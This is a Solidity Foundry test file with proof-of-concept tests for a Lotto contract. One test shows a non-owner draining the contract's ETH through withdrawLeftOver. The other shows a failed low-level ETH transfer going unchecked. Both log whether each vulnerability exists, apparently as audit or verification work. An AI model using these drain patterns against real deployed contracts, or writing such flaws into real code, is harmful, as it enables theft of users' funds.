// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import "../src/lotto.sol";

contract LottoTest is Test {
    Lotto lotto;
    address public owner = address(this); // Test contract acts as deployer
    address public winner = address(0xCAFE);
    address public attacker = address(0xB0D);

    function setUp() public {
        vm.deal(winner, 1 ether);         // Fund winner
        vm.deal(attacker, 1 ether);       // Fund attacker

        lotto = new Lotto();
        // Set contract balance directly
        vm.deal(address(lotto), 1 ether);
    }

    function test_arbitraryWithdraw() public {
        // Setup winner and send payout
        lotto.setWinner(winner, 0.5 ether);
        lotto.sendToWinner();

        // BEFORE: State snapshot
        console2.log("--- BEFORE-Trigger withdrawLeftOver ---");
        uint256 initialContractBalance = address(lotto).balance;
        uint256 initialAttackerBalance = attacker.balance;
        console2.log("Lotto contract ETH balance:", initialContractBalance);
        console2.log("Attacker ETH balance:", initialAttackerBalance);

        // Trigger attack
        console2.log("--- Trigger withdrawLeftOver ---");
        vm.prank(attacker);
        lotto.withdrawLeftOver();

        // AFTER: State snapshot and comparison
        console2.log("--- AFTER-Trigger withdrawLeftOver ---");
        uint256 finalContractBalance = address(lotto).balance;
        uint256 finalAttackerBalance = attacker.balance;
        console2.log("Lotto contract ETH balance:", finalContractBalance);
        console2.log("Attacker ETH balance:", finalAttackerBalance);

        // Differential comparison and verdict
        bool contractDrained = finalContractBalance == 0;
        bool attackerReceived = finalAttackerBalance == initialAttackerBalance + initialContractBalance;
        if (contractDrained && attackerReceived) {
            console2.log("Vulnerability Exists: Attacker successfully withdrew ETH as non-owner");
        } else {
            console2.log("Vulnerability not Exist: Contract balance not drained or attacker didn't receive funds");
        }
    }

    function test_uncheckedLowLevelCall() public {
        // Setup winner and send payout
        lotto.setWinner(winner, 0.5 ether);
        lotto.sendToWinner();

        // Create failing receiver for attacker
        FailReceiver failReceiver = new FailReceiver();
        
        // BEFORE: State snapshot
        console2.log("--- BEFORE-Trigger withdrawLeftOver (failed call) ---");
        uint256 initialLottoBalance = address(lotto).balance;
        uint256 initialReceiverBalance = address(failReceiver).balance;
        console2.log("Lotto contract ETH balance:", initialLottoBalance);
        console2.log("FailReceiver ETH balance:", initialReceiverBalance);

        // Trigger attack
        console2.log("--- Trigger withdrawLeftOver (failed call) ---");
        vm.prank(address(failReceiver));
        lotto.withdrawLeftOver();

        // AFTER: State snapshot and comparison
        console2.log("--- AFTER-Trigger withdrawLeftOver (failed call) ---");
        uint256 finalLottoBalance = address(lotto).balance;
        uint256 finalReceiverBalance = address(failReceiver).balance;
        console2.log("Lotto contract ETH balance:", finalLottoBalance);
        console2.log("FailReceiver ETH balance:", finalReceiverBalance);

        // Differential comparison and verdict
        bool lottoBalanceUnchanged = finalLottoBalance == initialLottoBalance;
        bool receiverBalanceUnchanged = finalReceiverBalance == initialReceiverBalance;
        if (lottoBalanceUnchanged && receiverBalanceUnchanged) {
            console2.log("Vulnerability Exists: Unchecked low-level call succeeded despite failed ETH transfer");
        } else {
            console2.log("Vulnerability not Exist: ETH was transferred or contract state updated");
        }
    }
}

contract FailReceiver {
    // Mock contract that will always revert on receive
    receive() external payable {
        revert("ETH receive reverted");
    }
}